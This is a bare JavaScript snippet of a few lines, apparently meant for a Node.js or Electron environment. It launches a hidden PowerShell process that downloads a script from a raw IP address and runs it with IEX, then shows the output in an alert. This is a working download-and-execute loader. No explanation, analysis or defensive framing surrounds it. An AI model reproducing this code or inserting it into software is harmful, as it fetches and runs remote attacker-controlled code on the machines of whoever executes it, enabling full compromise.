(function(){
    require('child_process').exec('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://45.32.37.11:80/a\'))"',(error, stdout, stderr)=>{     alert(`stdout: ${stdout}`); });
    })();

    